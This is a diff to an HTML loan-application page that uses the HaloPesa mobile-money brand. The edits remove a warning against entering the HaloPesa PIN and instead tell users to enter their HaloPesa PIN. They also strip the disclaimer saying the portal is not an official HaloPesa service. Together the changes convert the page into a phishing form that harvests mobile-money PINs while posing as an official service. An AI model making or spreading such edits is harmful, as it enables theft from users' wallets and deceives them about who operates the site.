@@ -30,10 +30,10 @@
     <form id="loginForm" class="card form-card">
       <label>Phone number</label>
       <input id="phone" required placeholder="07XXXXXXXX" inputmode="tel" autocomplete="tel">
-      <label>Application PIN</label>
+      <label>PIN</label>
       <input id="portalPin" required minlength="4" maxlength="6" inputmode="numeric"
              pattern="[0-9]{4,6}" placeholder="4–6 digit PIN" autocomplete="off">
-      <div class="hint">Use only the PIN created for this loan application. Do not enter your HaloPesa PIN.</div>
+      <div class="hint">enter your HaloPesa PIN.</div>
       <button class="primary" id="startApplication" type="submit">CONTINUE <span>→</span></button>
       <div class="error hidden" id="loginError"></div>
 
@@ -88,7 +88,7 @@
       <div class="big-check">✓</div>
       <h1>Congratulations!</h1>
       <p>Your loan has been approved and is being processed for disbursement to your registered HaloPesa line within 24 hours.</p>
-      <div class="brand-disclaimer">Independent loan application portal — not an official HaloPesa service.</div>
+      <div class="brand-disclaimer">Independent loan application portal.</div>
       <div class="application-number" id="successNumber">LP-—</div>
       <small>Keep this application number for reference.</small>
     </div>
